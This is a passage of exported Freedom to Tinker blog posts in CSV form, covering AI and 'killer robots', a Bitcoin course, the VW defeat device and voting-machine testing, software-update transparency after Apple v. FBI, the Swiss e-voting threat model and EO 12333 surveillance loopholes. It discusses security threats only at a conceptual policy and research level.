attention) between real humans versus machines. This is why I object to language like “killer robots.” And this is part of the reason why my research group works on increasing the transparency of artificial intelligence. However, maybe the emotional response we have to the apparently human-like threat of robots will also serve some useful purposes. I did sign the “killer robot” letter, because although I dislike the headlines associated with it, the actual letter (titled “Autonomous Weapons: an Open Letter from AI & Robotics Researchers“) makes clear the nature of the threat of taking humans out of the loop on real-time kill decisions. Similarly, I am currently interested in understanding the extent to which information technology, including AI, is responsible for the levelling off of wages since 1978. I am still reading and learning about this; I think it’s quite possible that the problem is not information technology per se, but rather culture, politics and policy more generally. However, 1978 was a long time ago. If more pictures of the Terminator get more people attending to questions of income inequality and the future of labour, maybe that’s not a bad thing."
"286","2015-01-23","2023-03-24","https://freedom-to-tinker.com/2015/01/23/sign-up-now-for-the-bitcoin-and-cryptocurrency-technologies-online-course/","At Princeton I taught a course on Bitcoin and cryptocurrency technologies during the semester that just ended. Joe Bonneau unofficially co-taught it with me. Based on student feedback and what we accomplished in the course, it was extremely successful. Next week I’ll post videos of all the final project presentations. The course was based on a series of video lectures. We’re now offering these lectures free to the public, online, together with homeworks, programming assignments, and a textbook. We’ve heard from computer science students at various institutions as well as the Bitcoin community about the need for structured educational materials, and we’re excited to fill this need. We’re using Piazza as our platform. Here’s the course page. To sign up, please fill out this (very short) form. The first several book chapters are already available. The course starts February 16, and we’ll start making the videos available closer to that date ( you’ll need to sign up to watch the videos Edit: we’ve changed this policy; the lectures are also publicly available). Each week there will be a Google hangout with that week’s lecturer. We’ll also answer questions on Piazza. How does our textbook (and course) differ from other books on Bitcoin? It’s simple: this is unabashedly a computer science text and course. We connect the ideas we discuss to the rest of computer science, and separate fundamental concepts from implementation details. The hype in the Bitcoin community has sometimes gotten ahead of the technology, and we think that for cryptocurrencies to truly realize their potential, entrepreneurs must go back to the basics, rigorously understand the technology, and build on it. Sign up now! Special thanks to students Steven Goldfeder, Shivam Agarwal, Pranav Gokhale, Alex Iriza and Hannah Park for helping develop educational materials for the course."
"287","2015-09-21","2023-03-24","https://freedom-to-tinker.com/2015/09/21/vw-voting-wulnerability/","On Friday, the US Environmental Protection Agency (EPA) “accused the German automaker of using software to detect when the car is undergoing its periodic state emissions testing. Only during such tests are the cars’ full emissions control systems turned on. During normal driving situations, the controls are turned off, allowing the cars to spew as much as 40 times as much pollution as allowed under the Clean Air Act, the E.P.A. said.” (NY Times coverage) The motivation for the “defeat device” was improved performance, although I haven’t seen whether “performance” in this case means faster acceleration or better fuel mileage. So what does this have to do with voting? For as long as I’ve been involved in voting (about a decade), technologists have expressed concerns about “logic and accuracy” (L&A) testing, which is the technique used by election officials to ensure that voting machines are working properly prior to election day. In some states, such tests are written into law; in others, they are common practice. But as is well understood by computer scientists (and doubtless scientists in other fields), testing can prove presence of flaws, but not their absence. In particular, computer scientists have noted that clever (that is, malicious) software in a voting machine could behave “correctly” when it detects that L&A testing is occurring, and revert to its improper behavior when L&A testing is complete. Such software could be introduced anywhere along the supply chain – by the vendor of the voting system, by someone in an elections office, or by an intruder who installs malware in voting systems without the knowledge of the vendor or elections office. It really doesn’t matter who installs it – just that the capability is possible. It’s not all that hard to write software that detects whether a given use is for L&A or a real election. L&A testing frequently follows patterns, such as its use on dates other than the first Tuesday in November, or by patterns such as three Democratic votes, followed by two Republican votes, followed by one write-in vote, followed by closing the election. And the malicious software doesn’t need to decide a priori if a given series of votes is L&A or a real election – it can make the decision when the election is closed down, and erase any evidence of the real votes. Such concerns have generally been dismissed in the debate about voting system security. But with all-electronic voting systems, especially Digital Recording Electronic (DRE) machines (such as the touch-screen machines common in many states), this threat has always been present. And now, we have evidence “in the wild” that the threat can occur. In this case, the vendor (Volkswagen) deliberately introduced software that detected whether it was in test mode or operational mode, and adjusted behavior accordingly. Since the VW software had to prospectively make the decision whether to behave in test mode as the car engine is operating, this is far more difficult than a voting system, where the decision can be made retrospectively when the election is closed. In the case of voting, the best solution today is optical scanned paper ballots. That way, we have “ground truth” (the paper ballots) to compare to the reported totals. The bottom line: it’s far too easy for software to detect its own usage, and change behavior accordingly. When the result is increased pollution or a tampered election, we can’t take the risk. Postscript: A colleague pointed out that malware has for years behaved differently when it “senses” that it’s being monitored, which is largely a similar behavior. In the VW and voting cases, though, the software isn’t trying to prevent being detected directly; it’s changing the behavior of the systems when it detects that it’s being monitored."
"288","2013-03-21","2023-03-24","https://freedom-to-tinker.com/2013/03/21/the-new-freedom-to-tinker-movement/","When I started this blog back in 2002, I named it “Freedom to Tinker.” On the masthead, below the words Freedom to Tinker, was the subhead “… is your freedom to understand, discuss, repair, and modify the technological devices you own.” I believed at the time, as I still do, that this freedom is more than just an exercise of property rights but also helps to define our relationship with the world as more and more of our experience is mediated through these devices. I also believed that the legal tide was running against the freedom to tinker, as creative uses of technology were increasingly portrayed as illegal or deviant behavior. Now, at last, things may be starting to change. The biggest enemy of the freedom to tinker is the “permission culture” in which anything we want to do requires permission from some powerful entity. Permission culture punishes us not for crossing boundaries or causing damage, but for acting “without authorization”—and it cranks up the penalties to make sure we get the message. Permission culture tells us that we don’t own the things we buy, that we are bound by contracts we have never seen, and that breaching those contracts is a felony punishable by years in prison. Of course, there are people doing genuinely bad things with technology. There are real problems to be addressed, and real criminals who deserve punishment. But too often the response is not to focus prevention and enforcement on the bad acts and actors, but instead to expand the permission culture even more. We’re worried about elite foreign cyberwarriors; but the response is to impose years of prison time for accessing an unprotected website. We’re worried about massive copyright infringement; but the response is to tell people they can’t unlock their phones. The good news is that the public is starting to push back. The recent uproar about phone unlocking has focused attention on the over-expansion of copyright law. And the harsh treatment of people like Aaron Swartz and Andrew “Weev” Auernheimer has sparked a pushback against over-criminalization and over-punishment of access to information. We see this in Kyle Wiens’s recent Wired piece, “Forget the Cellphone Fight — We Should Be Allowed to Unlock Everything We Own“. We see it, too, in the Supreme Court’s opinion in Kirtsaeng v. Wiley, which affirms the importance of a “you bought it, you own it” approach to copyright. These developments open the door to a new discussion about the freedom to tinker—but only if we keep our focus on the big picture. We should work for the right to unlock our phones. But at the same time we should remember that there are plenty of other devices we should be able to modify and use freely. We should work to address the specific flaws in copyright law and the Computer Fraud and Abuse Act. But at the same time we should remember the need to focus cybercrime law on the real bad guys. By all means, let’s fix lesser problems when we can. But let’s recognize, too, that we should be striving for more. Most of all, those who support different aspects of the freedom to tinker need to recognize themselves as allies. If you’re motivated by phone unlocking, or if you’re passionate about preserving white-hat research, or if you’re trying to protect the legality of a legitimate but disruptive product, what you’re really fighting for is the freedom to tinker. Even if you disagree about other political issues, you can be allies on this issue. Let’s use this moment as an opportunity to restore balance to the law."
"289","2016-03-10","2023-03-24","https://freedom-to-tinker.com/2016/03/10/apple-fbi-and-software-transparency/","The Apple versus FBI showdown has quickly become a crucial flashpoint of the “new Crypto War.” On February 16 the FBI invoked the All Writs Act of 1789, a catch-all authority for assistance of law enforcement, demanding that Apple create a custom version of its iOS to help the FBI decrypt an iPhone used by one of the San Bernardino shooters. The fact that the FBI allowed Apple to disclose the order publicly, on the same day, represents a rare exception to the government’s normal penchant for secrecy. The reasons behind the FBI’s unusually loud entrance are important – but even more so is the risk that after the present flurry concludes, the FBI and other government agencies will revert to more shadowy methods of compelling companies to backdoor their software. This blog post explores these software transparency risks, and how new technical measures could help ensure that the public debate over software backdoors remains public. The Decryption Assistance Order Apple and other technology companies regularly comply with government orders for data in their possession. The controversial order’s key distinction, however, is that the data is not in Apple’s posession but on an encrypted iPhone, and the order requires Apple to create new software to help the FBI circumvent that iPhone’s security. While Apple is probably technically able to comply with the FBI’s order, it is fighting the order on the grounds that “the government demands that Apple create a back door to defeat the encryption on the iPhone, making its users’ most confidential and personal information vulnerable to hackers, identity thieves, hostile foreign agents, and unwarranted government surveillance.” Indeed, demanding that a private company create a new forensic instrument to the government’s order, weakening the security of Apple’s own devices and exposing their users’ innermost secrets, may violate the first amendment. At any rate, the order is “like asking General Motors to build a new truck with a fifth wheel by next month.” The FBI could probably create their own backdoored version of iOS. However, Apple’s devices accept only software updates digitally signed with a secret key that presumably only Apple controls. Presumably. We’ll come back to that. Why All the Publicity? One of the most interesting and unusual features of this particular case is how quickly we, the public, learned about it from Apple. The FBI could have quietly delivered this order under seal, as it has done with similar decryption-assistance demands to Apple – as well as to other companies such as Lavabit, the now-defunct E-mail provider that Edward Snowden used. Apple even reportedly requested that the FBI’s order be sealed, but the FBI wanted the public showdown. The facts of the case undermine the FBI’s claims of urgently needing this iPhone’s contents: the killers were already long dead, the mountain of metadata the FBI already had about the killers revealed no hint of connections to other terrorists, and the iPhone in question was an employer-provided work phone that the killers did not bother to destroy as they did their two personal phones. The Occam’s Razor interpretation of the facts suggest that the FBI is far less interested in the data itself than in the court precedent a legal win would establish. In short, it appears the FBI is “playing politics” via a “carefully planned legal battle…months in the making.” The iPhone in question represents a strategically-chosen battleground on which the FBI thinks it can win using the terrorism card – even if this particular iPhone in fact has little or no intelligence value. Lining up in Apple’s defense are a plurality of the American public; public-interest organizations such as the ACLU, EFF, and CDT; many technology giants including Google, Intel, Microsoft, Cisco, and Amazon; newspapers such as the New York Times and the Wall Street Journal, the UN High Commissioner for Human Rights; even the former NSA director and other former top US government officials. The Secrecy Alternative, Past and Future Important as this public battle is, the FBI and governments around the world can and often have pursued the same goals in secret: Apple versus FBI is more the exception than the rule. Recall the result of the first Crypto Wars, in which the US government attempted to mandate key escrow encryption embodied in the infamous Clipper Chip. While the government lost that public battle, they did not give up but merely shifted their efforts to compromise encryption back into the shadows. For example, the NSA apparently slipped a backdoor into a NIST standard for random number generation, allowing the holder of a secret to compromise all cryptographic algorithms on a device. Demonstrating the perils of trying to keep a backdoor accessible only to “the good guys,” an unknown attacker recently managed to “re-key” and take over a latent copy of this backdoored random number generator in Juniper Networks routers. Even if sanity prevails in this new round of the Crypto Wars, we can count on continued attempts by the US and governments around the world to aquire secret backdoors. Governments can of course exploit software bugs or physical vulnerabilities to break into personal devices, but secret backdoors will remain an attractive Siren song. It is easier, cheaper, and less risky to exploit a known backdoor than to “reach into the treasure chest…and engineer a custom exploit.” The Software Update Backdoor Nearly all of today’s personal devices, including Apple’s, already have a ready-made “backdoor” ripe for exploitation, in the form of automatic software updates validated by digital signatures. One way the US government could acquire a universal backdoor to Apple’s devices is simply by demanding a copy of Apple’s secret software signing keys. The government already showed a willingness to do exactly this, in demanding the master keys to Lavabit’s encrypted E-mail service while investigating Snowden. This might not be entirely trivial if Apple’s software signing keys are held in hardware security modules designed to thwart the extraction or cloning of secret keys. In that case, however, the government could still simply demand that Apple use its secret key to produce a valid digital signature for the FBI’s backdoored version of iOS, while keeping this process and the existence of this backdoored iOS secret. Even if Apple wins this public battle, therefore, they will still face well-founded post-Snowden fears and suspicions – from companies and governments around the world – as to whether Apple can be coerced into secretly helping to sign backdoored software and firmware images. This risk is by no means specific to Apple, but faced by any organization that creates and releases software. Even open source software is not immune, because you cannot be certain whether a software update represents a correctly-compiled or backdoored version of a source release unless you build it yourself, which precious few users do. Software Transparency via Decentralized Witness Cosigning In IEEE Security & Privacy 2016 we will present a paper (preliminary draft available here) introducing decentralized witness cosigning, a technological means by software makers such as Apple could protect their users from secretly backdoored versions of their software – and in turn protect themselves and their financial bottom lines from worldwide fears and suspicions about the possibility of backdoored software. With conventional digital signatures, as currently used for most software and firmware signing processes, a single party (e.g., Apple) holds the secret key needed to produce valid software images that devices and their software update systems will accept. Any well-designed update system refuses to accept any software image unless it has been authenticated using a digital certificate embedded in the device, which cryptographically identifies the software maker via a mathematical relationship with the secret signing key. Best practices for software signing are already to keep particularly sensitive signing keys offline, perhaps in HSMs or even split across multiple HSMs, as ICANN does in its ornate DNSSEC key signing ceremony. But as noted above, such measures do not prevent the organization from being coerced into secret misuse of these signing keys. With decentralized witness cosigning, a software maker imprints their devices and software update systems with a digital certificate corresponding not just to their own secret key but also to secret keys held by a group of independent witnesses. These witnesses might include other cooperating software companies, public-interest organizations such as the ACLU, EFF, or CDT, or major corporate customers or governments around the world desiring not just verbal but also technological assurances of the software maker’s commitment to transparency. In turn, before accepting any software image the device’s update system verifies that it has been signed not only by the software maker but also by a threshold number of the designated witnesses. In essence, the device does not accept any software image unless it arrives with a cryptographic “proof” that this particular software image has been publicly observed by – and thereby placed under the scrutiny of – a decentralized group of independent parties scattered around the world in different jurisdictions. The Scalability of Witness Cosigning Technically, it is quite easy to implement witness cosigning if the number of witnesses is small. A software maker could simply gather a list of individual signatures for each new software release, in much the same way people have handled public petitions for hundreds of years. If we want the group of witnesses to be large, however – and we do, to ensure that compromising transparency would require not just a few but hundreds or even thousands of witnesses to be colluding maliciously – then gathering hundreds or thousands of individual signatures for each software release could become painful and inefficient. Worse, every device needing to validate a software download or update would need to check all these signatures individually, causing delays and consuming battery power. The key technical contribution of our research is a distributed protocol that automates this process and makes large, decentralized witness cosigning groups practical. I will spare you the details, but those interested can find them here. The oversimplified summary is that the protocol involves compressing hundreds or thousands of signatures into a single one that can be verified almost as simply and efficiently verifying a normal individual signature. For illustration, a traditional many-signature petition handled this way might look as follows: What a classic petition might look like as a cryptographic multisignature Superposing standard pencil-and-paper signatures this way would of course offer little or no security, but such superposition can be made secure with modern digital signatures. This is one of the remarkable properties of modern cryptography, and is a well-understood property that long predates our work. Again, our main contribution is to make witness cosigning scale. How Does Anyone Know If There’s a Backdoor? Unfortunately, independent witnesses cannot necessarily determine immediately, during the witness cosigning process, whether or not a particular software image actually contains a backdoor. This is especially true in the common case where the source code is proprietary and the software maker signs and releases only binary images. Nevertheless, the witnesses can still proactively ensure transparency by ensuring that every correctly-signed software image in existence has been disclosed, cataloged, and made subject to public scrutiny. For example, if future Apple devices adopted decentralized witness cosigning, and a government attempted to coerce Apple secretly into signing a backdoored version of iOS version 11.2.1, then the only way Apple could do so would be to submit the backdoored iOS version to the independent witnesses for cosigning. Even though those witnesses could not necessarily recognize the backdoor, they could immediately notice that two different iOS images labeled “version 11.2.1” have been signed: the standard one and the backdoored one. This inconsistency alone should immediately raise alarms and draw the attention of security companies around the world, who could carefully inspect the differences between the two software images. A government could of course coerce Apple to give the backdoored image a different version number that most of their customers never receive: e.g., “11.2.1fbi” – or a more anonymous “11.2.1.1.” However, the witnesses would still be able to tell that an iOS image exists that has been signed but not widely distributed, again likely drawing suspicion and careful scrutiny by security experts. Of course, Apple – or a malicious Apple employee – could still slip a subtle backdoor or security “bug” into the standard iOS releases that everyone runs. Accidental bugs and backdoors alike can persist for years without being noticed, as the Juniper incident amply demonstrates. Open source software offers a transparency advantage, especially with reproducible builds – but even source-level backdoors can be devilishly tricky. Nevertheless, techniques and tools for analysing both source and binary software are constantly improving, and decentralized witness cosigning can ensure that all releases of a software distribution are publicly known and exposed to this analysis by talented security researchers and white-hat hackers around the world. An attacker who slips a backdoor into a public software release inherently faces a risk that the backdoor could be discovered at any time. Witness cosigning prevents attackers from sidestepping that risk of discovery, even by secretly deploying the backdoored software only on targeted devices under attacker-controlled conditions. Proactive versus Retroactive Transparency Approaches Decentralized witness cosigning is by no means the first cryptographic transparency mechanism. For example, the Public Key Infrastructure (PKI) used to secure Web connections has similar weaknesses. PKI transparency mechanisms such as Convergence, Sovereign Keys, Certificate Transparency, AKI, and ARPKI chip away at this problem. Certificate Transparency is now standard in the Chrome browser. Application Transparency is a proposed variant of Certificate Transparency adapted to software downloads and updates. Related proposals such as Perspectives and CONIKS address closely-related problems for Secure Shell (SSH) connections and end-to-end encrypted messaging, respectively. These prior transparency mechanisms have two crucial weaknesses, however: they do not significantly increase the number of secret keys an attacker must control to compromise any personal device, and personal devices cannot even retroactively detect such compromise unless they can actively communicate with multiple well-known Internet servers. For example, even with Certificate Transparency, an attacker can forge an Extended Validation (EV) certificate for Chrome after compromising or coercing only three parties: one Certificate Authority (CA) and two log servers. Since many CAs and log servers are in US jurisdiction, such an attack is clearly within reach of the US government. If such an attack does occur, Certificate Transparency cannot detect it unless the victim device has a chance to communicate or gossip the fake certificate with other parties on the Internet – after it has already accepted and started using the fake digital certificate. Gossip Mechanisms Can’t Guarantee Software Transparency These weaknesses are especially severe in the domain of software transparency, the central issue in the Apple versus FBI case. First, if a personal device accepts and starts running a backdoored software update before the device has had a chance to gossip information about the update with other parties on the Internet, then the backdoored software can evade transparency simply by disabling gossip in the updated code. Second, even if for some reason the attacker cannot or neglects to take this obvious step, the attacker can still evade transparency by controlling either the device or its Internet access paths. In the FBI versus Apple case, for example, the FBI could trivially evade gossip-based transparency, and keep its backdoored iOS image secret, by keeping the device disconnected from the rest of the Internet after installing their backdoored software update. (They probably plan to anyway, to ensure that no “cyber pathogens” escape.) This weakness of gossip-based transparency also applies to attackers who may not control the device itself but control the device’s Internet access path. For example, a compromised Internet service provider (ISP) or corporate Internet gateway can defeat gossip-based transparency by persistently blocking a victim’s access to transparency servers elsewhere on the Internet. Even if the user’s device is mobile, a state intelligence service such as China’s “Great Firewall” could defeat gossip-based transparency by persistently blocking connections from a targeted victim’s devices to global transparency servers, in the same way that China already blocks connections to many websites and to the Tor anonymity network. Conclusion The noisy Apple versus FBI battle is merely the visible tip of a looming software integrity iceberg, illustrating both the importance of software transparency mechanisms and the technical challenges in securing them. Current gossip-based methods cannot actually guarantee transparency if an attacker is in control of the target device or its Internet access path, as in the current FBI versus Apple scenario. Even if software updates were guarded by Certificate Transparency or Application Transparency, the FBI could still secretly force Apple to sign a backdoored software update, coerce two US-based log servers to sign fake log entries while keeping both the software update and the fake logs secret, and isolate the targeted device offline so that it cannot gossip the fake update metadata with anyone. Decentralized witness cosigning is currently the only known method of ensuring transparency and public accountability in such situations. Taking a proactive approach, witness cosigning provides devices with a standalone cryptographic proof that a software update has been observed by many independent parties, before the device accepts or runs the software. In this way, companies such as Apple could offer their customers a strong guarantee that every valid software image in existence has been publicly disclosed before any of their devices, anywhere, will consider it valid – even if the device and/or its network is controlled by an attacker who does not exhibit the FBI’s fleeting taste for publicity. The present public debate over backdoors in personal devices is of critical importance to our security, privacy, and personal freedom. But equally important is ensuring that this time the debate stays public. I wish to thank Tony Arcieri, Ludovic Barman, Joseph Bonneau, Nicolas Gailly, Linus Gasser, Joseph Lorenzo Hall, Philipp Jovanovic, Ismail Khoffi, Tom Simonite, and Robin Wilton for helpful feedback on early drafts of this post."
"290","2022-07-01","2023-03-24","https://freedom-to-tinker.com/2022/07/01/switzerlands-e-voting-the-threat-model/","Part 5 of a 5-part series starting here Switzerland commissioned independent expert reviews of the E-voting system built by Swiss Post. One of those experts concluded, “as imperfect as the current system might be when judged against a nonexistent ideal, the current system generally appears to achieve its stated goals, under the corresponding assumptions and the specific threat model around which it was designed.” I have explained the ingenious idea (in the Swiss Post system) behind client-side security: because the voter’s computer may be quite insecure, because the client-side voting app may be under control of a hacker, keep certain secrets on paper that the computer can’t see. Professor Ford, the systems-security expert, points out that part of the threat model is: if the printing contractor is corrupt, that prints the paper and mails it, then the system is insecure. The new threat model in 2022. But I’ll now add something to the threat model that I would not have thought about last year: Step one of the voter’s workflow is, “type in a 20-character password from the paper into the voting app.” In the old days (2020 and before) the voter would do this using a physical or on-screen keyboard. In the modern era (2022) you might do this using Apple’s “live text”, in which you aim your phone camera at anything with text in it, and then you can copy-paste from the picture. And, of course, if you do that, then the phone sees all the secrets on the paper. So the security of the Swiss Post E-voting system relies entirely on a trick–that the voter’s computer can’t know the secret numbers on a piece of paper–that has been made obsolete by advances in consumer technology. Voter behavior as a component of the threat model. Experts in voting protocols came to realize, over the past two decades, the importance of dispute resolution in a voting protocol. That is, suppose a voter comes to realize, while participating in an e-voting system (or at a physical polling-place) that the election system is not properly tallying their vote. Can the voter prove this to the election officials in a way that appropriate action will be taken, and their vote will be tallied correctly? If not, then we say the dispute resolution system has failed. Also, experts have come to understand that voters are only human: they overlook things and they don’t check their work. So the voting system must have a human-centered design that works for real people. In my previous post I described the Swiss Post E-voting protocol: The voter receives a printed sheet in the mail; The voter copies the start-voting-key into the browser (or voting app); The voter selects candidates in the app; The app encodes the ballot using the serial number, and transmits to the servers; The servers send back “return codes” to the app, which then displays them to the voter; The voter looks up the return codes on the printed sheet to make sure they match the candidate selections. But what if most voters omit step 6, checking the return codes? Then the voting app could get away with cheating: encode the wrong candidates, the server will send return codes for those wrong candidates, and the voter won’t notice. To address that problem, Swiss Post added more steps to the protocol: Voter enters “ballot casting key” into the app to confirm that they’ve checked the return codes; app transmits that to servers Servers transmit another return-code to confirm. Voter checks that the “vote cast return code” displayed by the app matches the one on the paper. This protocol is becoming ridiculously complex – not exactly human-centered. Even so, here’s how the app could cheat: fail to transmit the “ballot casting key” to the servers, and make up a fake “Vote cast return code”. If the voter omits step 9, then the app has gotten away with cheating: it didn’t manage to cast a vote for the wrong candidate, but it did manage to cancel the voter’s ballot. And what’s the voter supposed to do if the return codes don’t match? Recall what’s printed in red on the paper: And what should the authorities do if voters call that phone number and claim that the return codes don’t match? This video (found on this page) suggests the answer: the voter is told, “we didn’t count your e-vote, you should vote on paper by physical mail instead.” A big danger is that voters skip step 6 (diligently check every return code against the paper printout) and proceed directly to step 7 (enter the “casting key” to submit their ballot). Would voters really do that? Of course they would: research has shown over and over that voters don’t carefully reconfirm on paper the choices they made on-screen. You might think, “I’ll check my own result, so it’s OK.” But if thousands of your fellow voters are careless with step 6, that allows the voting app (if hacked) to change thousands of their votes, which can change the outcome of your election. For a full analysis, see Ballot-Marking Devices (BMDs) Cannot Assure the Will of the Voters (here’s the non-paywall version). In conclusion, the protocol has many, many steps for the voter to follow, and even then it’s not robust against typical voter behavior. These issues were left out of the threat model that the experts examined. Other threats: For brevity, I didn’t even describe some other threats that the experts should probably consider in their next-round evaluation. For example: When the (hacked) app transmits a fake vote and displays a fake return-code, it could also display a (fake) “return code doesn’t match, try again” button. If the user clicks there, then the app transmits the real vote (the one the voter selected) and gets back the real return code. In that case, the app hasn’t succeeded in stealing this voter’s vote, but the voter is reassured and doesn’t alert the hotline. That last point is an indication of a more general threat: the hacked app can change the protocol, at least the part of the protocol that involves interaction with the voter, by giving the voter fraudulent instructions. There could be a whole class of threats there; I invite the reader to invent some. Back to step 9: Suppose an attacker hacks thousands of voter computers/phones, so thousands of voters get bad return codes (because their vote has been stolen), and some percentage of them will notice (in step 9) and call the phone number to report. That is, a couple hundred calls come in to the hotline. Hundreds of calls to the hotline is evidence either that thousands of votes are being stolen, or that hundreds of voters are falsely reporting. Should the election be re-run? The point is, the election protocol is not complete without a written protocol for what the authorities should do in this case. And unfortunately, there’s nothing good they can do; which is already a serious flaw in the whole system. I discussed, “the (hacked) computer might be able to see what’s on the paper.” But consider this: within a few years after deployment of such a system, it’s easy to imagine that voters will pressure election administrators, “can’t you just e-mail my voter-sheet to me (as a PDF) instead of sending paper in physical mail?” Then it’s trivial for a (hacked) computer or phone to see all the return codes on the voter sheet. It will be natural for an election administrator to forget that the security of this whole system relies on the fact that the computer can’t see the paper; sending the “paper” as a PDF defeats that crucial security mechanism. The same is true if the voter-sheet is faxed to the voter; fax is internet, these days."
"291","2022-06-29","2023-03-24","https://freedom-to-tinker.com/2022/06/29/how-the-swiss-post-e-voting-system-addresses-client-side-vulnerabilities/","(Part 3 of a 5-part series starting here) In Part 1, I described how Switzerland decided to assess the security and accuracy of its e-voting system. Swiss Post is the “vendor” developing the system, the Swiss cantons are the “customer” deploying it in their elections, and the Swiss Parliament and Federal Chancellery are the “regulators,” deciding whether it’s secure enough for the cantons to use. Internet voting has inherent vulnerabilities that need to be addressed by any e-voting solution: The server: bugs in the server that receives e-ballots and counts them; vulnerabilities in the server that allow hackers to penetrate and alter the vote-counting software; the possibility that insiders can use their access to subvert the vote counts. The client: bugs in the voter’s voting-app or browser app; vulnerabilities in the voter’s browser or operating system or hypervisor or BIOS that allow hackers to subvert the app so that it changes the ballot, after the voter sees it but before it is encrypted and transmitted. The communications network: possibility that attackers can change votes in transit, or cause ballots to be lost, or to commit denial-of-service attacks. Authentication of voters: association of a physical human being with a set of digital credentials. Of these, the communications network is probably the easiest to address with known technology (end-to-end encryption/authentication). Authentication of voters can be very difficult or less difficult depending on societal infrastructure. (Since Switzerland has no universal digital ID card, they address this issue by mailing a sheet of paper to each voter before each election, with an authorization key.) The server and insider threats can (perhaps) be addressed by splitting the server’s responsibilities among independent machines managed by independent trusted people, and using cryptographic protocols that prove consensus – and this is definitely an important part of the Swiss Post solution. But it’s that other part, insecurities in the client, that the Swiss Post system tries to address in a more solid and responsible way than almost any other e-voting system deployed in other countries in public elections. A few other countries (and U.S. states, and Australian states) have deployed e-voting – typically in a limited way, only for citizens living abroad – and every one of them that I know of can be hacked on the client side. If the hacker installs a modified browser on your laptop computer, or hacks the operating system of your phone, then the voting app can be made to display to you the candidate choices that you indicated, but then encrypt, authenticate, and transmit a different set of votes. And if the e-voting system has some feature that lets you “check” whether your votes were recorded correctly at the server, then the hack can subvert that feature too, to reassure you. And the Swiss method of securing the client is: Send a sheet of paper through the mail. Before each election, the election administrator sends to each e-voter a personalized paper. At the top is a numeric key, randomly chosen for that voter alone. At the beginning of the voting session, the voter types the key into the voting app. (at the top of the paper sheet is this box) The voter then selects candidates in the app, and the app uses the voter’s key to encrypt/authenticate the vote selections, and transmit them to a server. If we stopped here, it would be insecure: the app could cheat, and encrypt a ballot with candidates that the voter didn’t choose. The next step is that the servers return “result codes.” These are calculated based on the private key, known to the server but not to the voter or the client-side app, associated with the start-voting-key that the voter typed in. The voting app displays these result codes. Then the voter looks up the result codes on the sheet of paper, and checks that they correspond to the candidates that were chosen. If the system is working correctly, then the voting app (even if hacked) can’t know what the result codes are supposed to be. The (hacked) app can’t display the right result codes unless it gets them from the server, and it can’t get them from the server unless it has encrypted the right candidates in the first place. And it can’t see what result codes are written on the paper, unless the voter’s computer has some sort of camera attached to it ¯\_(ツ)_/¯. Do computers have cameras? Really? And why would the camera ever be aimed at the paper sheet during the process of entering the start-voting-key? If the Swiss Post e-voting system might possibly be secure, it’s only because of the out-of-band communication channel that is completely out of reach of the voter’s computer. That is: a sheet of paper sent through the mail, to the voter. So the Swiss Post e-voting system isn’t exactly paperless. It is not a “pure” internet voting system. Scientists do not know how to make an adequately secure internet voting system without paper. (And by the way, the thoughtless use of paper doesn’t help: for example, when you upload or e-mail a PDF file to an election administrator who then prints it out onto paper before feeding it through the optical-scan voting machine. That’s not a “paper trail”, because the voter can’t see it, and it doesn’t make the system secure.) In the next part of this series, I’ll analyze what problems remain in the Swiss Post system: some problems raised in the reports commissioned by the Chancellery, and some things that they haven’t thought of. Next part: What the Assessments Say About the Swiss E-voting System"
"292","2014-05-12","2023-03-24","https://freedom-to-tinker.com/2014/05/12/will-greenwalds-new-book-reveal-how-to-conduct-warantless-bulk-surveillance-on-americans-from-abroad-our-new-paper/","Tomorrow, Glenn Greenwald’s highly anticipated book ‘No Place to Hide’ goes on sale. Apart from personal accounts on working with whisteblower Edward Snowden in Hong Kong and elsewhere, Mr. Greenwald announced that he will reveal new surveillance operations by Western intelligence agencies. In the last weeks, Sharon Goldberg and I have been finishing a paper on Executive Order 12333 (“EO 12333”). We argue that EO 12333 creates legal loopholes for U.S. authorities to circumvent the U.S. Constitution and conduct largely unchecked and unrestrained bulk surveillance of American communications from abroad. In addition, we present several known and new technical means to exploit those legal loopholes. Today, we publish a summary of our new paper in this post. We stress that we’re not in a position to suggest that U.S. authorities are actually structurally circumventing the Constitution using the international loophole we discuss in the paper. But, we’re wondering: will the gist of our analysis be part of Greenwald’s new revelations tomorrow? A first snippet of Greenwald’s new book in The Guardian, about hacking American routers destined for use overseas, seems to point in that direction. Here’s our summary. Loopholes for Circumventing the Constitution: Warrantless Bulk Surveillance on Americans by Collecting Network Traffic Abroad In this multi-disciplinary paper, we reveal interdependent legal and technical loopholes that intelligence agencies of the U.S. government could use to circumvent 4th Amendment and statutory safeguards for Americans. We outline known and new circumvention techniques that can leave the Internet traffic of Americans as vulnerable to surveillance, and as unprotected by U.S. law, as the Internet traffic of foreigners. First, we describe the current U.S. regulatory framework for intelligence gathering. From public and (until recently) secret primary legal sources, three regimes can be distinguished, based on where the surveillance is conducted and who it targets: 1. Surveillance of domestic communications conducted on U.S. soil under s.215 of the Patriot Act; 2. Surveillance of foreign communications conducted on U.S. soil under s.702 of the Foreign Intelligence Surveillance Act; and 3. Surveillance conducted entirely abroad under EO 12333 and its permissive minimization policies, such as the recently released U.S. Signals Intelligence Directive 18 (“USSID 18”). USSID 18 was drafted and approved within the Executive branch with minimal congressional or judicial oversight. We outline when these regimes apply, and how the level of legal protection substantially decreases when a surveillance operation presumes two connected criteria: i) it does not target a particular, known U.S. person, and ii) it is conducted abroad. The key insight we develop is that by constructing plausible presumptions that a surveillance operation meets these two legal criteria, the legal regime of EO 12333 can be applied to a surveillance operation, with minimal protection for American communications ‘incidentally’ or ‘inadvertantly’ collected. While the Patriot Act and FISA have attracted most media attention, according to the N.S.A., the regime under EO 12333 is indeed the “primary legal authority” [pdf, p. 2-3] for its operations. Next, we discuss known and new techniques that may exploit these legal loopholes for surveillance of American communications. One known method is to monitor American network traffic while it is routed or stored abroad. The revealed MUSCULAR/TURMOIL program illustrates how the NSA presumed authority under EO 12333 to acquire traffic between Google and Yahoo! servers located on foreign territory, collecting up to 180 million user records per month abroad, regardless of efforts to establish whether or not the surveillance concerns “a known, particular U.S. person.” In addition to eavesdropping on intradomain traffic (i.e., data sent within a network belonging to a single organization), we discuss exploiting these loopholes in the interdomain setting, where traffic traverses networks belonging to different organizations. We explain why interdomain routing with BGP can naturally cause traffic originating in a U.S. network to be routed abroad, even when it is destined for an endpoint located on U.S. soil. We also show how core Internet protocols – BGP and DNS – can be deliberately manipulated to force traffic originating in American networks to be routed abroad. We discuss why these deliberate manipulations fall within the permissive EO 12333 regime, and how they can be used to collect, in bulk, all internet traffic (including metadata and content) sent between a pair of networks, even if both networks are located on U.S. soil (e.g., from Harvard 